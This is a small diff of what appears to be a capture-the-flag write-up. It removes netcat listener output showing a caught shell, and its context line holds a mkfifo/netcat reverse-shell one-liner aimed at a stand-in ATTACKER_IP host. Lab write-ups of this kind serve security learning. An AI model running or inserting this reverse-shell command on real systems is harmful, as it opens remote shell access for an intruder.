@@ -49,10 +49,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP$ 4444 >/tmp/f
 
 ```
 └─$ nc -nlvp 4444                                                                                                       
-listening on [any] 4444 ...
-connect to [10.6.27.203] from (UNKNOWN) [10.10.185.28] 44757
-/bin/sh: can't access tty; job control turned off
-/app/bfc_thehubint # 
 ```
 
 ```
